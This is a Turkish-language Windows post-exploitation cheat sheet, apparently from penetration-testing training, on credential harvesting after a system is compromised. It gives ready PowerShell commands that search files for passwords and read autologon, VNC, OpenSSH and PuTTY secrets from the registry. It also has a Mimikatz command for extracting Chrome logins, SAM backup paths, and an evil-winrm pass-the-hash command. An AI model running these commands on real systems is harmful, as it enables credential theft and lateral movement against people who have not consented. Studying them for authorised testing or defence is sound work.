## Genel Şifre Arama

Powershell, sızma sonrası keşif aşamasında spesifik dosyaları bulmak için değerli bir araçtır. Bir Windows sisteminin güvenliğini aştıktan sonra, yetki yükseltme için parolaları aramak kritik öneme sahip olabilir.

Dosyalarda 'password' kelimesini arayıp .conf uzantılı olanları filtrelemek için;

```auto
cd "C:\Program Files"
Get-ChildItem -Recurse -ErrorAction SilentlyContinue | Select-String "password" -List | select path | where path -like "*.conf"
```

## Winlogon

Autologon etkinleştirildiğinde, parolanın düz metin olarak saklanmış olma ihtimali vardır. Bunu öğrenmek için aşağıdaki komutla winlogon keylerini sorgulayabiliriz:

```auto
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" DefaultUserName
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" DefaultPassword
```

## Hizmet Şifre ve Oturum Arama

VNC, OpenSSH gibi hizmetlerin şifrelerini, keylerini görmek için

```auto
Get-ItemProperty "HKCU:\Software\ORL\WinVNC3\Password"
Get-ItemProperty "HKCU:\Software\TightVNC\Server" Password 
Get-ItemProperty "HKLM:\Software\TightVNC\Server" Password 
Get-ItemProperty "HKCU:\Software\OpenSSH\Agent\Keys"
Get-ItemProperty "HKLM:\Software\OpenSSH\Agent\Keys"
```

Putty oturumlarını çalabilmek için

```auto
Get-ItemProperty "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

komutlarını kullanabiliriz.

## Tarayıcı Şifreleri

Mimikatz hedef bilgisayarda Chrome şifreleri veya oturum bilgileri için kullanılabilir.

```auto
dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /masterkey:<MASTERKEY>
```

## Güvenlik Hesabı Yöneticisi (SAM)

Güvenlik Hesabı Yöneticisi (SAM), Windows'ta kullanıcı adları ve parolaları içeren kullanıcı hesaplarını depolayan bir veritabanı dosyasıdır. Kimliği doğrulanmamış kullanıcıların sisteme erişmesini önlemek için kriptografik önlemler kullanır.

SAM, yerel ve uzak kullanıcıların kimliğini doğrulamak için kullanılabilir ve Active Directory'de kullanıcıların kimliğini doğrular.

SAM dosyası sistemde

C:\Windows\System32\config

adresinde saklanır, ancak Windows SAM dosyası üzerinde özel bir kilit tuttuğundan ve bilgisayar kapatılana kadar bu kilit serbest bırakılmayacağından, Windows içinden taşınamaz veya kopyalanamaz.

SAM yedekleri aşağıdaki lokasyonlarda bulunabilir.

```auto
C:\Windows\repair\SAM
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\SAM
```

Creddump7, Windows işletim sistemlerinde güvenlik bilgilerini ve kimlik bilgilerini çıkarmak için kullanılan bir komut satırı aracıdır. Parolaları ve hash'leri çalmak için kullanılabilir.

Daha fazla bilgi için [https://github.com/moyix/creddump](https://github.com/moyix/creddump)

## Pass-the-Hash Saldırısı

Windows, kullanıcı parolalarını doğrudan depolamaz. Bunun yerine, parola hash'lerini saklar. Kimlik doğrulama sırasında, Windows kullanıcının girdiği parolayı karmalar ve karşılaştırır.

Mimikatz kullanarak bu hashler ele geçirilebilir.

Pass-the-hash saldırısında aktör, bu hashi kullanarak kimlik doğrulama yapar.

Örneğin "evilwin-rm" ile kullanımı aşağıdaki gibi.

```auto
evil-winrm -u <USERNAME> -H <HASH> -i <IP>
```
